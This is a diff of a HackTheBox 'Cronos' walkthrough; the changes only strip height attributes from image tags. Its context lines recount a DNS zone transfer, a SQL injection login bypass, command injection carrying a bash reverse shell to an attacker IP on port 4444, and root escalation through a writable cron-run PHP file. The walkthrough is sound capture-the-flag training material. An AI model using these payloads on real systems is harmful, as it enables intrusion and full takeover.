@@ -66,7 +66,7 @@ Nothing useful, which makes complete sense in hindsight: scanning the bare IP wh
 With port 53 open, the first move is adding `cronos.htb` to `/etc/hosts` and seeing if that changes anything...
 ...and It did!
 
-<img width="1461" height="785" alt="image" src="https://github.com/user-attachments/assets/e8e76bbd-0745-4fba-8fd9-6cdf5a112562" />
+<img width="1461" alt="image" src="https://github.com/user-attachments/assets/e8e76bbd-0745-4fba-8fd9-6cdf5a112562" />
 
 Browsing to `http://cronos.htb/` now showed a proper website instead of the Apache default, confirming that what we were missing was the DNS name. Of course, this was a "guess", but attackers should try everything, it's a trial and error sometimes...
 
@@ -76,7 +76,7 @@ But the more interesting thing DNS can give us is a zone transfer. When misconfi
 dig axfr @10.10.10.13 cronos.htb
 ```
 
-<img width="891" height="262" alt="image" src="https://github.com/user-attachments/assets/2c476784-2a2b-4a2e-9856-07d5b95df7fd" />
+<img width="891" alt="image" src="https://github.com/user-attachments/assets/2c476784-2a2b-4a2e-9856-07d5b95df7fd" />
 
 It worked. Zone transfer succeeded and returned every DNS record for the domain, subdomains included. Among them: **admin.cronos.htb**.
 
@@ -88,7 +88,7 @@ You can also confirm the hostname directly:
 nslookup 10.10.10.13 10.10.10.13
 ```
 
-<img width="547" height="65" alt="image" src="https://github.com/user-attachments/assets/2269803b-cbb5-4c59-9dfe-652e37da9280" />
+<img width="547" alt="image" src="https://github.com/user-attachments/assets/2269803b-cbb5-4c59-9dfe-652e37da9280" />
 
 This would also give us an hint on the domain with no guessing needed :)
 
@@ -97,11 +97,11 @@ This would also give us an hint on the domain with no guessing needed :)
 ## Web Application Reconnaissance
 
 ### cronos.htb
-<img width="1461" height="785" alt="image" src="https://github.com/user-attachments/assets/770dc590-398c-44d3-b132-418205ce0ced" />
+<img width="1461" alt="image" src="https://github.com/user-attachments/assets/770dc590-398c-44d3-b132-418205ce0ced" />
 
 The main site was Laravel-based. Following the Documentation link redirected to the Laravel docs, which confirmed the PHP framework. 
 
-<img width="1300" height="890" alt="image" src="https://github.com/user-attachments/assets/cb0ed410-5728-4b2b-b2fd-fdbad7c52d4b" />
+<img width="1300" alt="image" src="https://github.com/user-attachments/assets/cb0ed410-5728-4b2b-b2fd-fdbad7c52d4b" />
 
 I did poked around, and was a little lost for a little bit, but there was really nothing to attack here. The interesting stuff was on the subdomain.
 
@@ -109,7 +109,7 @@ I did poked around, and was a little lost for a little bit, but there was really
 
 Navigating to `admin.cronos.htb` showed a login form. No CAPTCHA. No rate limiting. No account lockout. Just a username and password field sitting there. The ideal conditions for injection testing.
 
-<img width="1078" height="433" alt="image" src="https://github.com/user-attachments/assets/07e04197-2fcb-41ec-b169-4bd2a54f0c9e" />
+<img width="1078" alt="image" src="https://github.com/user-attachments/assets/07e04197-2fcb-41ec-b169-4bd2a54f0c9e" />
 
 ---
 
@@ -129,7 +129,7 @@ That dropped straight into the admin panel. It really was that simple... An SQL 
 
 The admin panel contained what looked like a network diagnostic tool, a form that let you type in a host and choose between `ping` and `traceroute`, then showed you the output in the browser. A tool that takes user input and passes it to a shell command. I mean, come on... Command line injection? AFTER I LOS- okay I will calm down now...
 
-<img width="598" height="293" alt="image" src="https://github.com/user-attachments/assets/c6d0dc4a-0eed-4ffc-9563-59e85f0d6440" />
+<img width="598" alt="image" src="https://github.com/user-attachments/assets/c6d0dc4a-0eed-4ffc-9563-59e85f0d6440" />
 
 I sent the request to Burp Suite's Repeater and chained a bash reverse shell onto the command:
 
@@ -137,7 +137,7 @@ I sent the request to Burp Suite's Repeater and chained a bash reverse shell ont
 command=traceroute;bash+-c+'bash+-i+>&+/dev/tcp/10.10.14.X/4444+0>&1'
 ```
 
-<img width="1115" height="634" alt="image" src="https://github.com/user-attachments/assets/3372f808-be55-4187-8072-f12bbd7635c3" />
+<img width="1115" alt="image" src="https://github.com/user-attachments/assets/3372f808-be55-4187-8072-f12bbd7635c3" />
 
 Listener ready on the other side:
 
@@ -147,7 +147,7 @@ nc -lvp 4444
 
 Shell came back as `www-data`.
 
-<img width="487" height="154" alt="image" src="https://github.com/user-attachments/assets/f0eeba45-86d1-4d72-a083-e08622877c64" />
+<img width="487" alt="image" src="https://github.com/user-attachments/assets/f0eeba45-86d1-4d72-a083-e08622877c64" />
 
 ---
 
@@ -157,7 +157,7 @@ Shell came back as `www-data`.
 
 While I had a shell as `www-data`, I dug through the web application files, and in the admin app's `config.php`, there it was, MySQL credentials sitting in plaintext.
 
-<img width="574" height="155" alt="image" src="https://github.com/user-attachments/assets/5d751338-f7d4-4ace-b87f-ddb794d7b440" />
+<img width="574" alt="image" src="https://github.com/user-attachments/assets/5d751338-f7d4-4ace-b87f-ddb794d7b440" />
 
 I connected to the database:
 ```bash
@@ -165,7 +165,7 @@ mysql -u admin -p
 ```
 
 ...And enumerate it a bit, finding an hash for DB admin
-<img width="655" height="435" alt="image" src="https://github.com/user-attachments/assets/ecc67161-66f4-4948-82a9-59c9da48c658" />
+<img width="655" alt="image" src="https://github.com/user-attachments/assets/ecc67161-66f4-4948-82a9-59c9da48c658" />
 
 The users table had an MD5 hash for the admin account. Running it through a cracker gave **1327663704**. 
 
@@ -173,7 +173,7 @@ These are the real login credentials for the admin panel, the ones you'd need wi
 
 Interesting enough, I also found a second database for the Laravel application, went through it looking for anything useful, and came up empty. Dead end. Moving on.
 
-<img width="658" height="184" alt="image" src="https://github.com/user-attachments/assets/9a43fe04-3687-4510-9b42-25b43a49ac41" />
+<img width="658" alt="image" src="https://github.com/user-attachments/assets/9a43fe04-3687-4510-9b42-25b43a49ac41" />
 
 ---
 
@@ -189,7 +189,7 @@ Yes, I should have guess it by the box name... Give me a break!
 cat /etc/crontab
 ```
 
-<img width="826" height="281" alt="image" src="https://github.com/user-attachments/assets/6dc2957d-a1f3-4456-a3bc-3704b6435805" />
+<img width="826" alt="image" src="https://github.com/user-attachments/assets/6dc2957d-a1f3-4456-a3bc-3704b6435805" />
 
 A job running as **root**, every single minute, executing a PHP file inside the Laravel web directory. The web directory, the one that belongs to `www-data`. The one we can write to.
 
@@ -212,7 +212,7 @@ Then waited. Less than a minute later, root fired the cron job, executed our she
 
 **Root flag:**
 
-<img width="577" height="174" alt="image" src="https://github.com/user-attachments/assets/76e0370b-a08f-4cf3-8697-52d2b1501bca" />
+<img width="577" alt="image" src="https://github.com/user-attachments/assets/76e0370b-a08f-4cf3-8697-52d2b1501bca" />
 
 ---
 
